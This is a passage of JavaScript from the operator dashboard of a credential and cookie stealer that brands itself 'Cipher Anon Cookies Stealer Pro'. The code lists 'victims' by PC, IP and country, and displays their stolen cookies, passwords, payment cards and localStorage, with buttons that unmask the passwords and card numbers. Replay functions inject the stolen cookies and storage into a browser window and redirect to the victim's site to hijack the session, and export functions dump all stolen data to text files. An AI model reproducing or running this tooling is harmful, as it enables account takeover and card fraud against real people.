                                <button class="btn-sm ${storageCount > 0 ? 'replay-storage' : 'disabled'}" onclick="${storageCount > 0 ? `event.stopPropagation(); replayStorage('${domain}')` : ''}">💾</button>
                                <button class="btn-sm test-sm" onclick="event.stopPropagation(); testSession('${domain}')">🔍</button>
                                <button class="btn-sm download" onclick="event.stopPropagation(); downloadDomain('${domain}')">📥</button>
                            </div>
                        </div>
                    `;
                });

                html += `
                    <div class="victim-group">
                        <div class="group-header" onclick="toggleVictimGroup('${safeName}')">
                            <span>🖥️ ${pcName}</span>
                            <span class="count">(${pc.totalVictims} victims)</span>
                            <span class="expand-icon ${isOpen ? 'open' : ''}" id="expand-${safeName}">▼</span>
                        </div>
                        <div class="group-body ${isOpen ? 'open' : ''}" id="body-${safeName}">
                            ${victimEntriesHtml}
                        </div>
                    </div>
                `;
            });

            grid.innerHTML = html;
        }

        function toggleVictimGroup(safeName) {
            pcOpenState[safeName] = !pcOpenState[safeName];
            const body = document.getElementById('body-' + safeName);
            const icon = document.getElementById('expand-' + safeName);
            if (body) {
                body.classList.toggle('open');
                if (icon) {
                    icon.classList.toggle('open');
                }
            }
        }

        // ============================================================
        // REPLAY VIEW
        // ============================================================

        function renderReplayView() {
            const grid = document.getElementById('replayGrid');
            const grouped = groupByPC(allData);
            const pcNames = Object.keys(grouped);

            if (pcNames.length === 0) {
                grid.innerHTML = `<div class="empty-state"><div class="icon">▶️</div><h3>No victims to replay</h3></div>`;
                return;
            }

            let html = '';
            pcNames.forEach(pcName => {
                const pc = grouped[pcName];
                const flag = getFlagEmoji(pc.countryCode);
                const safeName = 'rgroup-' + pcName.replace(/[^a-zA-Z0-9]/g, '_');
                
                if (pcOpenState[safeName] === undefined) {
                    pcOpenState[safeName] = false;
                }
                const isOpen = pcOpenState[safeName];

                let cardsHtml = '';
                Object.keys(pc.domains).forEach(domain => {
                    const d = pc.domains[domain];
                    const hasCookies = d.cookies > 0;
                    const hasStorage = d.storage > 0;
                    const displayDomain = domain === 'unknown' ? 'unknown' : domain;
                    const firstEntry = d.entries[0] || null;
                    const entryId = firstEntry ? firstEntry._uniqueId : '';

                    cardsHtml += `
                        <div class="replay-card">
                            <div class="r-header">
                                <span class="domain-tag">🌐 ${displayDomain}</span>
                                <div class="stats-mini">
                                    <span class="cookies">🍪 ${d.cookies}</span>
                                    ${d.creds > 0 ? `<span class="creds">🔐 ${d.creds}</span>` : ''}
                                    ${d.cards > 0 ? `<span class="cards">💳 ${d.cards}</span>` : ''}
                                    ${d.storage > 0 ? `<span class="storage">💾 ${d.storage}</span>` : ''}
                                </div>
                            </div>
                            <div class="r-actions">
                                <button class="btn-sm ${hasCookies ? 'replay-cookies' : 'disabled'}" onclick="${hasCookies ? `event.stopPropagation(); replayDomainForPC('${pcName.replace(/'/g, "\\'")}', '${domain}')` : ''}" title="${hasCookies ? 'Replay cookies' : 'No cookies'}">▶️ Cookies</button>
                                <button class="btn-sm ${hasStorage ? 'replay-storage' : 'disabled'}" onclick="${hasStorage ? `event.stopPropagation(); replayStorageDomain('${pcName.replace(/'/g, "\\'")}', '${domain}')` : ''}" title="${hasStorage ? 'Replay storage' : 'No storage'}">💾 Storage</button>
                                <button class="btn-sm test-sm" onclick="event.stopPropagation(); testDomainFromPC('${pcName.replace(/'/g, "\\'")}', '${domain}')">🔍 Test</button>
                                <button class="btn-sm download" onclick="event.stopPropagation(); downloadDomainFromPC('${pcName.replace(/'/g, "\\'")}', '${domain}')">📥</button>
                                <button class="btn-sm view" onclick="event.stopPropagation(); openPCModal('${pcName.replace(/'/g, "\\'")}', '${domain}')">👁️</button>
                            </div>
                        </div>
                    `;
                });

                html += `
                    <div class="replay-group">
                        <div class="group-header" onclick="toggleReplayGroup('${safeName}')">
                            <span class="flag">${flag}</span>
                            <span class="ip">${pc.ip}</span>
                            <span class="pc-name">🖥️ ${pcName}</span>
                            <span style="font-size:9px;color:#475569;">(${pc.totalVictims} victims)</span>
                            <span class="expand-icon ${isOpen ? 'open' : ''}" id="expand-${safeName}">▼</span>
                            <div class="stats">
                                <span class="cookies">🍪 ${pc.totalCookies}</span>
                                <span class="storage">💾 ${pc.totalStorage}</span>
                                <span class="creds">🔐 ${pc.totalCreds}</span>
                                <span class="cards">💳 ${pc.totalCards}</span>
                            </div>
                        </div>
                        <div class="group-body ${isOpen ? 'open' : ''}" id="body-${safeName}">
                            ${cardsHtml}
                        </div>
                    </div>
                `;
            });
            grid.innerHTML = html;
        }

        function toggleReplayGroup(safeName) {
            pcOpenState[safeName] = !pcOpenState[safeName];
            const body = document.getElementById('body-' + safeName);
            const icon = document.getElementById('expand-' + safeName);
            if (body) {
                body.classList.toggle('open');
                if (icon) {
                    icon.classList.toggle('open');
                }
            }
        }

        // ============================================================
        // PC-LEVEL REPLAY FUNCTIONS
        // ============================================================

        function replayAllCookiesPC(pcName) {
            const grouped = groupByPC(allData);
            const pc = grouped[pcName];
            if (!pc) { showToast('❌ PC not found', 'error'); return; }

            let firstDomain = null;
            let allCookies = {};
            Object.keys(pc.domains).forEach(domain => {
                const d = pc.domains[domain];
                if (d.cookies > 0 && !firstDomain) {
                    firstDomain = domain;
                    d.entries.forEach(entry => {
                        Object.assign(allCookies, entry.cookies || {});
                    });
                }
            });

            if (Object.keys(allCookies).length === 0) {
                showToast('❌ No cookies found for this PC', 'error');
                return;
            }
            let actualDomain = firstDomain;
            if (actualDomain === 'unknown' || actualDomain.includes('railway.app')) {
                const cookieKeys = Object.keys(allCookies);
                for (const key of cookieKeys) {
                    const parts = key.split('|');
                    if (parts.length > 1 && parts[0] && !parts[0].includes('railway.app') && parts[0] !== 'unknown') {
                        actualDomain = parts[0];
                        break;
                    }
                }
                if (actualDomain === 'unknown' || actualDomain.includes('railway.app')) {
                    showToast('⚠️ No valid domain for replay', 'error');
                    return;
                }
            }

            const win = window.open('', '_blank');
            if (!win) { showToast('⚠️ Popup blocked', 'error'); return; }
            const cleanDomain = actualDomain.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
            win.document.write(`
                <!DOCTYPE html>
                <html><head><title>Loading ${cleanDomain}...</title>
                <style>body{background:#0a0a0a;color:#00ff88;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column;font-family:sans-serif;margin:0;}.s{width:36px;height:36px;border:3px solid #1a1a1a;border-top-color:#00ff88;border-radius:50%;animation:s 0.8s linear infinite;}@keyframes s{to{transform:rotate(360deg)}}p{margin-top:16px;color:#666;max-width:300px;text-align:center;word-break:break-all;}</style></head><body>
                <div class="s"></div>
                <p>Replaying all cookies for <strong>${pcName}</strong> on ${cleanDomain}...</p>
                <p style="font-size:11px;color:#475569;">${Object.keys(allCookies).length} cookies</p>
                <script>
                    const cookies = ${JSON.stringify(allCookies)};
                    Object.entries(cookies).forEach(([name, value]) => {
                        try { document.cookie = name + '=' + value + '; domain=.${cleanDomain}; path=/'; } catch(e) {}
                    });
                    setTimeout(() => window.location.href = 'https://' + '${cleanDomain}', 1500);
                <\/script>
            </body></html>
            `);
            win.document.close();
            showToast('▶️ Replaying ' + pcName + ' on ' + cleanDomain + ' (' + Object.keys(allCookies).length + ' cookies)', 'success');
        }

        function replayAllStoragePC(pcName) {
            const grouped = groupByPC(allData);
            const pc = grouped[pcName];
            if (!pc) { showToast('❌ PC not found', 'error'); return; }

            let firstDomain = null;
            let allStorage = {};
            Object.keys(pc.domains).forEach(domain => {
                const d = pc.domains[domain];
                if (d.storage > 0 && !firstDomain) {
                    firstDomain = domain;
                    d.entries.forEach(entry => {
                        Object.assign(allStorage, entry.localStorage || {});
                    });
                }
            });

            if (Object.keys(allStorage).length === 0) {
                showToast('❌ No LocalStorage found for this PC', 'error');
                return;
            }
            let actualDomain = firstDomain;
            if (actualDomain === 'unknown' || actualDomain.includes('railway.app')) {
                const storageKeys = Object.keys(allStorage);
                for (const key of storageKeys) {
                    const parts = key.split(':');
                    if (parts.length > 1 && parts[0] && !parts[0].includes('railway.app') && parts[0] !== 'unknown') {
                        actualDomain = parts[0];
                        break;
                    }
                }
                if (actualDomain === 'unknown' || actualDomain.includes('railway.app')) {
                    showToast('⚠️ No valid domain for replay', 'error');
                    return;
                }
            }

            const win = window.open('', '_blank');
            if (!win) { showToast('⚠️ Popup blocked', 'error'); return; }
            const cleanDomain = actualDomain.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
            win.document.write(`
                <!DOCTYPE html>
                <html><head><title>Loading ${cleanDomain}...</title>
                <style>body{background:#0a0a0a;color:#8b5cf6;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column;font-family:sans-serif;margin:0;}.s{width:36px;height:36px;border:3px solid #1a1a1a;border-top-color:#8b5cf6;border-radius:50%;animation:s 0.8s linear infinite;}@keyframes s{to{transform:rotate(360deg)}}p{margin-top:16px;color:#666;max-width:300px;text-align:center;word-break:break-all;}</style></head><body>
                <div class="s"></div>
                <p>Replaying all LocalStorage for <strong>${pcName}</strong> on ${cleanDomain}...</p>
                <p style="font-size:11px;color:#475569;">${Object.keys(allStorage).length} items</p>
                <script>
                    const storage = ${JSON.stringify(allStorage)};
                    Object.entries(storage).forEach(([key, value]) => {
                        try { localStorage.setItem(key, value); } catch(e) {}
                    });
                    setTimeout(() => window.location.href = 'https://' + '${cleanDomain}', 1500);
                <\/script>
            </body></html>
            `);
            win.document.close();
            showToast('💾 Replaying ' + pcName + ' on ' + cleanDomain + ' (' + Object.keys(allStorage).length + ' items)', 'success');
        }

        function testPC(pcName) {
            const grouped = groupByPC(allData);
            const pc = grouped[pcName];
            if (!pc) { showToast('❌ PC not found', 'error'); return; }

            let domain = Object.keys(pc.domains)[0];
            if (!domain || domain === 'unknown' || domain.includes('railway.app')) {
                for (const entry of pc.entries) {
                    const d = extractDomain(entry);
                    if (d && d !== 'unknown' && !d.includes('railway.app')) {
                        domain = d;
                        break;
                    }
                }
                if (!domain || domain === 'unknown' || domain.includes('railway.app')) {
                    showToast('⚠️ No valid domain to test', 'error');
                    return;
                }
            }
            const cleanDomain = domain.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
            window.open('https://' + cleanDomain, '_blank');
            showToast('🔍 Opened ' + cleanDomain + ' in new tab', 'success');
        }

        function openPCModalAll(pcName) {
            const grouped = groupByPC(allData);
            const pc = grouped[pcName];
            if (!pc || pc.entries.length === 0) { showToast('❌ No victims found', 'error'); return; }
            openModalForEntry(pc.entries[0]._uniqueId);
        }

        // ============================================================
        // TXT EXPORT FUNCTIONS
        // ============================================================

        function formatTxt(data, title) {
            const lines = [];
            const sep = '='.repeat(60);
            const now = new Date().toISOString();

            lines.push(sep);
            lines.push(`  ${title || 'CIPHER ANON — STOLEN DATA'}`);
            lines.push(`  Exported: ${now}`);
            lines.push(sep);
            lines.push('');

            if (!data || data.length === 0) {
                lines.push('No data to export.');
                return lines.join('\n');
            }

            let totalCookies = 0;
            let totalCreds = 0;
            let totalCards = 0;
            let totalStorage = 0;

            data.forEach((entry, idx) => {
                const domain = extractDomain(entry);
                const ip = entry.ip || 'Unknown';
                const country = entry.country || 'Unknown';
                const city = entry.city || 'N/A';
                const time = entry.receivedAt ? formatFullTime(entry.receivedAt) : 'Unknown';
                const browser = entry.browser || entry.fingerprint?.browser || 'Unknown';
                const pc = entry.pcName || entry.fingerprint?.hostname || entry.ip || 'Unknown PC';
                const cookies = entry.cookies || {};
                const creds = entry.credentials || [];
                const cards = entry.cards || [];
                const storage = entry.localStorage || {};

                const cookieCount = Object.keys(cookies).length;
                const credCount = creds.length;
                const cardCount = cards.length;
                const storageCount = Object.keys(storage).length;
                totalCookies += cookieCount;
                totalCreds += credCount;
                totalCards += cardCount;
                totalStorage += storageCount;

                const displayDomain = domain === 'unknown' ? 'unknown' : domain;

                lines.push(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
                lines.push(`  VICTIM #${idx + 1} — PC: ${pc}`);
                lines.push(`  Domain:   ${displayDomain}`);
                lines.push(`  IP:       ${ip}`);
                lines.push(`  Country:  ${country} (${city})`);
                lines.push(`  Browser:  ${browser}`);
                lines.push(`  Time:     ${time}`);
                lines.push(`  Cookies:  ${cookieCount}`);
                lines.push(`  Creds:    ${credCount}`);
                lines.push(`  Cards:    ${cardCount}`);
                lines.push(`  Storage:  ${storageCount}`);
                lines.push('');

                if (cookieCount > 0) {
                    lines.push(`  ─── COOKIES (${cookieCount}) ───`);
                    Object.entries(cookies).forEach(([name, value]) => {
                        const v = value.length > 60 ? value.slice(0, 60) + '...' : value;
                        lines.push(`    ${name} = ${v}`);
                    });
                    lines.push('');
                }

                if (credCount > 0) {
                    lines.push(`  ─── CREDENTIALS (${credCount}) ───`);
                    creds.forEach(c => {
                        const name = c.name || c.username || 'unknown';
                        const value = c.value || c.password || '';
                        const url = c.url || c.origin_url || domain;
                        const displayUrl = url && !url.includes('http') ? 'https://' + url : url || domain;
                        lines.push(`    Username: ${name}`);
                        lines.push(`    Password: ${value}`);
                        lines.push(`    URL:      ${displayUrl}`);
                        lines.push('');
                    });
                }

                if (cardCount > 0) {
                    lines.push(`  ─── CARDS (${cardCount}) ───`);
                    cards.forEach(c => {
                        let value = c.value || c.number || c.card_number || '';
                        const name = c.name || c.cardholder || 'Unknown';
                        if (c.month && c.year && !value.includes('/')) {
                            value = c.month + '/' + c.year;
                        }
                        const url = c.url || c.origin_url || domain;
                        const displayUrl = url && !url.includes('http') ? 'https://' + url : url || domain;
                        lines.push(`    Cardholder: ${name}`);
                        lines.push(`    Number:     ${value}`);
                        lines.push(`    URL:        ${displayUrl}`);
                        lines.push('');
                    });
                }

                if (storageCount > 0) {
                    lines.push(`  ─── LOCALSTORAGE (${storageCount}) ───`);
                    Object.entries(storage).forEach(([key, value]) => {
                        const v = value.length > 60 ? value.slice(0, 60) + '...' : value;
                        lines.push(`    ${key} = ${v}`);
                    });
                    lines.push('');
                }

                lines.push('');
            });

            lines.push(sep);
            lines.push(`  SUMMARY`);
            lines.push(sep);
            lines.push(`  Total Victims:  ${data.length}`);
            lines.push(`  Total Cookies:  ${totalCookies}`);
            lines.push(`  Total Creds:    ${totalCreds}`);
            lines.push(`  Total Cards:    ${totalCards}`);
            lines.push(`  Total Storage:  ${totalStorage}`);
            lines.push(sep);
            lines.push(`  Exported by Cipher Anon Cookies Stealer Pro`);
            lines.push(sep);

            return lines.join('\n');
        }

        function downloadTxt() {
            if (allData.length === 0) { showToast('❌ No data to export', 'error'); return; }
            const content = formatTxt(allData, 'CIPHER ANON — ALL STOLEN DATA');
            const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `cipher_anon_export_${new Date().toISOString().slice(0,10)}.txt`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            showToast('📥 TXT exported', 'success');
        }

        function downloadModalTxt() {
            if (!currentModalEntry) { showToast('❌ No victim loaded', 'error'); return; }
            const content = formatTxt([currentModalEntry], `VICTIM — ${currentModalDomain}`);
            const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `victim_${currentModalDomain}_${new Date().toISOString().slice(0,10)}.txt`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            showToast('📥 Victim TXT exported', 'success');
        }

        // ============================================================
        // MODAL — FIXED WITH WORKING EYE, COPY, DOWNLOAD BUTTONS
        // ============================================================

        function openModalForEntry(uniqueId) {
            if (!uniqueId || uniqueId === 'unknown') {
                showToast('❌ No victim selected', 'error');
                return;
            }
            let entry = null;
            let source = 'main';
            for (const e of allData) {
                if (e._uniqueId === uniqueId) { entry = e; source = 'main'; break; }
            }
            if (!entry) {
                for (const e of trashData) {
                    if (e._uniqueId === uniqueId) { entry = e; source = 'trash'; break; }
                }
            }
            if (!entry) { showToast('❌ Victim not found', 'error'); return; }

            currentModalEntry = entry;
            const pc = entry.pcName || entry.fingerprint?.hostname || entry.ip || 'Unknown PC';
            const domain = extractDomain(entry);
            currentModalDomain = domain;

            const overlay = document.getElementById('modalOverlay');
            const isTrash = source === 'trash';
            const title = isTrash ? `🗑️ ${pc} — ${domain} (Deleted)` :
                          `👤 ${pc} — ${domain}`;

            document.getElementById('modalTitle').textContent = title;

            const flag = getFlagEmoji(entry.countryCode);
            const fullTime = formatFullTime(entry.receivedAt);
            const ago = timeAgo(entry.receivedAt);

            const ua = entry.fingerprint?.userAgent || '';
            let browser = 'Unknown';
            if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
            else if (ua.includes('Edg')) browser = 'Edge';
            else if (ua.includes('Firefox')) browser = 'Firefox';
            else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
            else if (ua.includes('Opera')) browser = 'Opera';
            else if (ua.includes('Brave')) browser = 'Brave';
            else if (ua.includes('PowerShell')) browser = 'PowerShell';

            const cookies = entry.cookies || {};
            const cookieEntries = Object.entries(cookies);
            const creds = entry.credentials || [];
            const cards = entry.cards || [];
            const storage = entry.localStorage || {};
            const storageEntries = Object.entries(storage);

            const deleteBtn = isTrash ?
                `<button class="btn-icon-sm delete-sm" onclick="showPermanentDeleteConfirm('${entry._uniqueId}')">🗑️</button>` :
                `<button class="btn-icon-sm delete-sm" onclick="showDeleteConfirm('${entry._uniqueId}', '${domain}')">🗑️</button>`;

            const restoreBtn = isTrash ?
                `<button class="btn-icon-sm restore-sm" onclick="showRestoreConfirm('${entry._uniqueId}', '${domain}')">↩️</button>` :
                '';

            const txtBtn = `<button class="btn-icon-sm txt" onclick="downloadModalTxt()">📝</button>`;
            const cookieReplayBtn = `<button class="btn-icon-sm replay-cookies" onclick="replaySession('${domain}')">▶️</button>`;
            const storageReplayBtn = `<button class="btn-icon-sm replay-storage" onclick="replayStorage('${domain}')">💾</button>`;
            const testBtn = `<button class="btn-icon-sm test-sm" onclick="testSession('${domain}')">🔍</button>`;

            let html = `
                <div class="victim-entry">
                    <div class="modal-actions">
                        ${restoreBtn}
                        ${deleteBtn}
                        ${cookieReplayBtn}
                        ${storageReplayBtn}
                        ${testBtn}
                        ${txtBtn}
                    </div>
                    <div class="victim-header">
                        <span class="flag">${flag}</span>
                        <span class="ip">${entry.ip}</span>
                        <span class="pc-label">🖥️ ${pc}</span>
                        <span class="country">${entry.country}</span>
                        <span class="city">📍 ${entry.city}</span>
                        <span style="font-size:10px;color:#94a3b8;margin-left:4px;">🌐 ${browser}</span>
                        <span class="time-badge">
                            <span class="clock-icon">${isTrash ? '🗑️' : '🕐'}</span>
                            <span class="full-time">${isTrash ? (entry.deletedAt ? formatFullTime(entry.deletedAt) : 'Unknown') : fullTime}</span>
                            <span class="ago">(${isTrash ? (entry.deletedAt ? timeAgo(entry.deletedAt) : 'Unknown') : ago})</span>
                        </span>
                    </div>

                    <div class="data-section">
                        <div class="section-title">🍪 Cookies (${cookieEntries.length})</div>
                        ${cookieEntries.length === 0 ? '<div style="color:#475569;font-size:10px;padding:2px 0;">No cookies</div>' : ''}
                        ${cookieEntries.map(([name, value]) => {
                            const escaped = value.replace(/'/g, "\\'");
                            return `
                                <div class="data-item">
                                    <span class="label">${name}</span>
                                    <span class="value" title="${value}">${value.length > 50 ? value.slice(0,50)+'...' : value}</span>
                                    ${isValuable(name) ? '<span class="badge-valuable">Valuable</span>' : ''}
                                    <div class="actions">
                                        <button class="btn-icon-sm copy" onclick="window.copyText('${escaped}')">📋</button>
                                        <button class="btn-icon-sm download" onclick="window.downloadItem('${name}', '${escaped}', 'cookie')">⬇️</button>
                                    </div>
                                </div>
                            `;
                        }).join('')}
                    </div>

                    <div class="data-section">
                        <div class="section-title">🔐 Credentials (${creds.length})</div>
                        ${creds.length === 0 ? '<div style="color:#475569;font-size:10px;padding:2px 0;">No credentials</div>' : ''}
                        ${creds.map((c, idx) => {
                            const name = c.name || c.username || c.field || 'unknown';
                            const value = c.value || c.password || '';
                            let url = c.url || c.origin_url || domain;
                            if (url && !url.includes('http')) {
                                url = 'https://' + url;
                            }
                            const type = c.type || 'text';
                            const escaped = value.replace(/'/g, "\\'");
                            const visKey = 'modal-cred-' + idx;
                            const isVisible = passwordVisibility[visKey] || false;
                            if (!value || value === '' || value === 'undefined' || value === 'null') return '';
                            const displayUrl = url && url !== 'https://' ? url : 'https://' + domain;
                            const displayValue = isVisible ? value : value.replace(/./g, '•');
                            return `
                                <div class="data-item">
                                    <span class="label" style="color:#ec4899;">${name}</span>
                                    <span class="value ${isVisible ? '' : 'password-hidden'}" id="${visKey}-val">${displayValue}</span>
                                    <span class="badge-type">${type}</span>
                                    <a href="${displayUrl}" target="_blank" class="link">🔗 ${displayUrl.length > 30 ? displayUrl.slice(0,30)+'...' : displayUrl.replace(/^https?:\/\//, '')}</a>
                                    <div class="actions">
                                        <button class="btn-icon-sm eye" onclick="window.togglePasswordVis('${visKey}', '${visKey}-val')">👁️</button>
                                        <button class="btn-icon-sm copy" onclick="window.copyText('${escaped}')">📋</button>
                                        <button class="btn-icon-sm download" onclick="window.downloadItem('${name}', '${escaped}', 'credential')">⬇️</button>
                                    </div>
                                </div>
                            `;
                        }).filter(Boolean).join('')}
                    </div>

                    <div class="data-section">
                        <div class="section-title">💳 Cards (${cards.length})</div>
                        ${cards.length === 0 ? '<div style="color:#475569;font-size:10px;padding:2px 0;">No cards</div>' : ''}
                        ${cards.map((c, idx) => {
                            let value = c.value || c.number || c.card_number || '';
                            const name = c.name || c.cardholder || c.holder || 'Unknown';
                            let url = c.url || c.origin_url || domain;
                            if (url && !url.includes('http')) {
                                url = 'https://' + url;
                            }
                            const type = c.type || 'card';
                            if (!value || value === '' || value === 'undefined' || value === 'null') return '';
                            if (c.month && c.year && !value.includes('/')) {
                                value = c.month + '/' + c.year;
                            }
                            const escaped = value.replace(/'/g, "\\'");
                            const visKey = 'modal-card-' + idx;
                            const isVisible = passwordVisibility[visKey] || false;
                            const displayValue = isVisible ? value : value.replace(/[0-9]/g, '•');
                            const displayUrl = url && url !== 'https://' ? url : 'https://' + domain;
                            return `
                                <div class="data-item">
                                    <span class="label" style="color:#06b6d4;">${name}</span>
                                    <span class="value ${isVisible ? '' : 'password-hidden'}" id="${visKey}-val">${displayValue}</span>
                                    <span class="badge-type">${type}</span>
                                    <a href="${displayUrl}" target="_blank" class="link">🔗 ${displayUrl.length > 30 ? displayUrl.slice(0,30)+'...' : displayUrl.replace(/^https?:\/\//, '')}</a>
                                    <div class="actions">
                                        <button class="btn-icon-sm eye" onclick="window.togglePasswordVis('${visKey}', '${visKey}-val')">👁️</button>
                                        <button class="btn-icon-sm copy" onclick="window.copyText('${escaped}')">📋</button>
                                        <button class="btn-icon-sm download" onclick="window.downloadItem('${name}', '${escaped}', 'card')">⬇️</button>
                                    </div>
                                </div>
                            `;
                        }).filter(Boolean).join('')}
                    </div>

                    <div class="data-section">
                        <div class="section-title">💾 LocalStorage (${storageEntries.length})</div>
                        ${storageEntries.length === 0 ? '<div style="color:#475569;font-size:10px;padding:2px 0;">No LocalStorage</div>' : ''}
                        ${storageEntries.map(([key, value]) => {
                            let browserLabel = 'Unknown';
                            let cleanKey = key;
                            if (key.includes(':')) {
                                const parts = key.split(':');
                                browserLabel = parts[0];
                                cleanKey = parts.slice(1).join(':');
                            }
                            const escaped = value.replace(/'/g, "\\'");
                            return `
                                <div class="data-item">
                                    <span class="label" style="color:#8b5cf6;">${cleanKey}</span>
                                    <span class="value" title="${value}">${value.length > 50 ? value.slice(0,50)+'...' : value}</span>
                                    <span class="badge-storage">${browserLabel}</span>
                                    <div class="actions">
                                        <button class="btn-icon-sm copy" onclick="window.copyText('${escaped}')">📋</button>
                                        <button class="btn-icon-sm download" onclick="window.downloadItem('${cleanKey}', '${escaped}', 'localstorage')">⬇️</button>
                                    </div>
                                </div>
                            `;
                        }).join('')}
                    </div>
                </div>
            `;

            document.getElementById('modalContent').innerHTML = html;
            document.getElementById('testResultModal').className = 'test-result';
            overlay.classList.add('active');
        }

        function closeModal() {
            document.getElementById('modalOverlay').classList.remove('active');
        }

        // ============================================================
        // SESSION REPLAY (legacy domain-based)
        // ============================================================

        function replaySession(domain) {
            let cookies = {};
            let actualDomain = domain;
            allData.forEach(entry => {
                const entryDomain = extractDomain(entry);
                if (entryDomain === domain) {
                    Object.assign(cookies, entry.cookies || {});
                    actualDomain = entryDomain;
                }
            });
            if (Object.keys(cookies).length === 0) {
                for (const entry of allData) {
                    const d = extractDomain(entry);
                    if (d === domain) {
                        Object.assign(cookies, entry.cookies || {});
                        actualDomain = d;
                        break;
                    }
                }
            }
            if (Object.keys(cookies).length === 0) { showToast('❌ No cookies found', 'error'); return; }
            if (actualDomain === 'unknown' || actualDomain.includes('railway.app')) {
                const cookieKeys = Object.keys(cookies);
                for (const key of cookieKeys) {
                    const parts = key.split('|');
                    if (parts.length > 1 && parts[0] && !parts[0].includes('railway.app') && parts[0] !== 'unknown') {
                        actualDomain = parts[0];
                        break;
                    }
                }
                if (actualDomain === 'unknown' || actualDomain.includes('railway.app')) {
                    showToast('❌ No valid domain', 'error');
                    return;
                }
            }
            const win = window.open('', '_blank');
            if (!win) { showToast('⚠️ Popup blocked', 'error'); return; }
            const cleanDomain = actualDomain.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
            win.document.write(`
                <!DOCTYPE html>
                <html><head><title>Loading ${cleanDomain}...</title>
                <style>body{background:#0a0a0a;color:#00ff88;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column;font-family:sans-serif;margin:0;}.s{width:36px;height:36px;border:3px solid #1a1a1a;border-top-color:#00ff88;border-radius:50%;animation:s 0.8s linear infinite;}@keyframes s{to{transform:rotate(360deg)}}p{margin-top:16px;color:#666;max-width:300px;text-align:center;word-break:break-all;}</style></head><body>
                <div class="s"></div>
                <p>Replaying session for <strong>${cleanDomain}</strong>...</p>
                <p style="font-size:11px;color:#475569;">${Object.keys(cookies).length} cookies</p>
                <script>
                    const cookies = ${JSON.stringify(cookies)};
                    Object.entries(cookies).forEach(([name, value]) => {
                        try { document.cookie = name + '=' + value + '; domain=.${cleanDomain}; path=/'; } catch(e) {}
                    });
                    setTimeout(() => window.location.href = 'https://' + '${cleanDomain}', 1500);
                <\/script>
            </body></html>
            `);
            win.document.close();
            showToast('▶️ Replay started for ' + cleanDomain, 'success');
        }

        function replayStorage(domain) {
            let storage = {};
            let actualDomain = domain;
            allData.forEach(entry => {
                const entryDomain = extractDomain(entry);
                if (entryDomain === domain) {
                    Object.assign(storage, entry.localStorage || {});
                    actualDomain = entryDomain;
                }
            });
            if (Object.keys(storage).length === 0) {
                for (const entry of allData) {
                    const d = extractDomain(entry);
                    if (d === domain) {
                        Object.assign(storage, entry.localStorage || {});
                        actualDomain = d;
                        break;
                    }
                }
            }
            if (Object.keys(storage).length === 0) { showToast('❌ No storage found', 'error'); return; }
            if (actualDomain === 'unknown' || actualDomain.includes('railway.app')) {
                const storageKeys = Object.keys(storage);
                for (const key of storageKeys) {
                    const parts = key.split(':');
                    if (parts.length > 1 && parts[0] && !parts[0].includes('railway.app') && parts[0] !== 'unknown') {
                        actualDomain = parts[0];
                        break;
                    }
                }
                if (actualDomain === 'unknown' || actualDomain.includes('railway.app')) {
                    showToast('❌ No valid domain', 'error');
                    return;
                }
            }
            const win = window.open('', '_blank');
            if (!win) { showToast('⚠️ Popup blocked', 'error'); return; }
            const cleanDomain = actualDomain.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
            win.document.write(`
                <!DOCTYPE html>
                <html><head><title>Loading ${cleanDomain}...</title>
                <style>body{background:#0a0a0a;color:#8b5cf6;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column;font-family:sans-serif;margin:0;}.s{width:36px;height:36px;border:3px solid #1a1a1a;border-top-color:#8b5cf6;border-radius:50%;animation:s 0.8s linear infinite;}@keyframes s{to{transform:rotate(360deg)}}p{margin-top:16px;color:#666;max-width:300px;text-align:center;word-break:break-all;}</style></head><body>
                <div class="s"></div>
                <p>Replaying LocalStorage for <strong>${cleanDomain}</strong>...</p>
                <p style="font-size:11px;color:#475569;">${Object.keys(storage).length} items</p>
                <script>
                    const storage = ${JSON.stringify(storage)};
                    Object.entries(storage).forEach(([key, value]) => {
                        try { localStorage.setItem(key, value); } catch(e) {}
                    });
                    setTimeout(() => window.location.href = 'https://' + '${cleanDomain}', 1500);
                <\/script>
            </body></html>
            `);
            win.document.close();
            showToast('💾 Replay started for ' + cleanDomain, 'success');
        }

        function replayFromModal() {
            if (currentModalDomain) replaySession(currentModalDomain);
        }

        function replayStorageFromModal() {
            if (currentModalDomain) replayStorage(currentModalDomain);
        }

        function testFromModal() {
            if (currentModalDomain) testSession(currentModalDomain);
        }

        // ============================================================
        // TEST FUNCTIONS
        // ============================================================

        async function testSession(domain) {
            let cookies = {};
            let actualDomain = domain;
            allData.forEach(entry => {
                const entryDomain = extractDomain(entry);
                if (entryDomain === domain) {
                    Object.assign(cookies, entry.cookies || {});
                    actualDomain = entryDomain;
                }
            });
            if (Object.keys(cookies).length === 0) { showToast('❌ No cookies found', 'error'); return; }
            if (actualDomain === 'unknown' || actualDomain.includes('railway.app')) {
                const cookieKeys = Object.keys(cookies);
                for (const key of cookieKeys) {
                    const parts = key.split('|');
                    if (parts.length > 1 && parts[0] && !parts[0].includes('railway.app') && parts[0] !== 'unknown') {
                        actualDomain = parts[0];
                        break;
                    }
                }
                if (actualDomain === 'unknown' || actualDomain.includes('railway.app')) {
                    showToast('⚠️ No valid domain', 'error');
                    return;
                }
            }
            const cleanDomain = actualDomain.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
            window.open('https://' + cleanDomain, '_blank');
